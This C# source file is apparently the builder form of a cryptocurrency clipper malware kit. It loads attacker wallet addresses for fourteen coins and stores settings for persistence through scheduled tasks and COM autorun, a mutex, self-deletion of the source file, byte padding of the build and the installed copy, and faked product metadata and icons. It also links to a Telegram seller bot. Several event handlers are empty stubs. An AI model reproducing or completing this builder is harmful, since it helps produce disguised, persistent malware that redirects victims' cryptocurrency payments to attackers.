using dnlib.DotNet;
using MetroFramework.Forms;
using System;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using dnlib.DotNet.Emit;
using System.Diagnostics;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Builder
{
    public partial class Form1 : MetroForm
    {
        public static string iconsexe = $"";
        public static string btc = "0";
        public static string bc1 = "0";
        public static string eth = "0";
        public static string xmr = "0";
        public static string xlm = "0";
        public static string xrp = "0";
        public static string ltc = "0";
        public static string nec = "0";
        public static string bch = "0";
        public static string dash = "0";
        public static string doge = "0";
        public static string trx = "0";
        public static string zcash = "0";
        public static string bnb = "0";
        public Form1(string fileName)
        {
            InitializeComponent();
        }

        private async void metroButton_BUILD_Click(object sender, EventArgs e)
        {
           
            SaveSettings(); // Сохраняем настройки

        }

        // Сохраняем настройки
        public void SaveSettings()
        {
            // Load settings System path
            if (metroComboBox1.SelectedIndex == 0)
                Properties.Builder.Default.systemPath = 0;
            else if (metroComboBox1.SelectedIndex == 1)
                Properties.Builder.Default.systemPath = 1;
            else if (metroComboBox1.SelectedIndex == 2)
                Properties.Builder.Default.systemPath = 2;
            else if (metroComboBox1.SelectedIndex == 3)
                Properties.Builder.Default.systemPath = 3;

            Properties.Builder.Default.dir = metroTextBox_dir.Text;
            Properties.Builder.Default.bin = metroTextBox_bin.Text;
            Properties.Builder.Default.taskName = metroTextBox_taskName.Text;
            Properties.Builder.Default.mutEx = metroTextBox_mutEx.Text;
            Properties.Builder.Default.key_String = metroTextBox_keyString.Text;

            if (metroCheckBox_fileInfo.Checked == true)
                Properties.Builder.Default.btnAssembly = true;
            else
                Properties.Builder.Default.btnAssembly = false;
            
            Properties.Builder.Default.product = metroTextBox_product.Text;
            Properties.Builder.Default.description = metroTextBox_description.Text;
            Properties.Builder.Default.company = metroTextBox_company.Text;
            Properties.Builder.Default.copyright = metroTextBox_copyright.Text;
            Properties.Builder.Default.trademarks = metroTextBox_trademarks.Text;
            Properties.Builder.Default.org_filename = metroTextBox_org_filename.Text;
            Properties.Builder.Default.prod_version = metroTextBox_prod_version.Text;
            Properties.Builder.Default.file_version = metroTextBox_file_version.Text;

            if (metroCheckBox_ico.Checked == true)
            {
                Properties.Builder.Default.ico = true;
                Properties.Builder.Default.fileico = iconsexe;
            }
            else 
            { 
                Properties.Builder.Default.ico = false;
                Properties.Builder.Default.fileico = "";
            }


            if (metroToggle_install.Checked == true)
                Properties.Builder.Default.install = true;
            else
                Properties.Builder.Default.install = false;

            if (metroToggle_autoRunCOM.Checked == true)
                Properties.Builder.Default.AutoRunCOM = true;
            else
                Properties.Builder.Default.AutoRunCOM = false;

            if (metroToggle_autoRunSchduler.Checked == true)
                Properties.Builder.Default.AutoRunScheduler = true;
            else
                Properties.Builder.Default.AutoRunScheduler = false;

            if (metroToggle_delSourceFile.Checked == true)
                Properties.Builder.Default.FileSource_Delete = true;
            else
                Properties.Builder.Default.FileSource_Delete = false;

            if (metroCheckBox_addBuildBytes.Checked == true)
                Properties.Builder.Default.addBytesBuildc = true;
            else
                Properties.Builder.Default.addBytesBuildc = false;

            if (metroCheckBox_addBytesInstall.Checked == true)
                Properties.Builder.Default.addBytesInstallc = true;
            else
                Properties.Builder.Default.addBytesInstallc = false;


            Properties.Builder.Default.addBytesBuild_kb = addBytesbuildnum.Value;
            Properties.Builder.Default.addBytesInstall_kb = addBytesInfectionNum.Value;



        }


        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
           
        }

        // Генерация рандомного MutEx
        private void metroButton17_Click(object sender, EventArgs e)
        {
        }

        // Копируем  Info С другого файла
        private void metroButton9_Click(object sender, EventArgs e)
        {
           
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            
        }

        // Получаем иконку файла
        private void metroButton16_Click(object sender, EventArgs e)
        {
           
        }

        public static string LoadTxt(string lts)
        {
            string wallets = "";
            string[] lines = File.ReadAllLines(lts);
            foreach (string s in lines)
            {
                wallets += s.Trim() + ",".Trim();
            }
            return wallets;
        }
        public void ReLoad()
        {
            metro_wallet_info.Text = $"BTC:{btc}|BC1:{bc1}|ETH:{eth}|XMR:{xmr}|XLM:{xlm}|XRP:{xrp}|LTC:{ltc}|NEC:{nec}|BCH:{bch}|DASH:{dash}|DOGE:{doge}|TRX:{trx}|ZCASH:{zcash}|BNB:{bnb}";
        }

        private async void metroButton1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                btn_btc13.Enabled = false;
                                Properties.Wallets.Default.btc = LoadTxt(ofd.FileName);
                                Properties.Wallets.Default.Save();
                                btc = (Properties.Wallets.Default.btc.Trim().Split(',').Length - 1).ToString();
                                btn_btc13.Enabled = true;
                                
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                        ReLoad();
                    });
                }
            }
        }

        private async void metroButton18_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                btn_bc1.Enabled = false;
                                Properties.Wallets.Default.bc1 = LoadTxt(ofd.FileName);
                                Properties.Wallets.Default.Save();
                                bc1 = (Properties.Wallets.Default.bc1.Trim().Split(',').Length - 1).ToString();
                                btn_bc1.Enabled = true;
                            }
                            else
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                        }
                        catch { };
                        ReLoad();
                    });
                }
            }
        }

        private async void metroButton4_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                btn_trc.Enabled = false;
                                Properties.Wallets.Default.trx = LoadTxt(ofd.FileName);
                                Properties.Wallets.Default.Save();
                                trx = (Properties.Wallets.Default.trx.Trim().Split(',').Length - 1).ToString();
                                btn_trc.Enabled = true;
                            }
                            else
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                        }
                        catch { };
                        ReLoad();
                    });

                }

            }
        }

        private async void metroButton2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                btn_eth.Enabled = false;
                                Properties.Wallets.Default.eth = LoadTxt(ofd.FileName);
                                Properties.Wallets.Default.Save();
                                eth = (Properties.Wallets.Default.eth.Trim().Split(',').Length - 1).ToString();
                                btn_eth.Enabled = true;
                            }
                            else
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                        }
                        catch { };
                        ReLoad();
                    });

                }

            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
           
        }

        private void metroButton7_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton13_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
           
        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
           
        }

        private void metroButton15_Click(object sender, EventArgs e)
        {
            

        }

        private void metroLink2_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/devxstudiobot");
        }

        private void metroButton19_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton21_Click(object sender, EventArgs e)
        {
           
        }

        private void metroButton22_Click(object sender, EventArgs e)
        {
          
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void metroLabel2_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox2_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox3_Click(object sender, EventArgs e)
        {

        }
    }
}
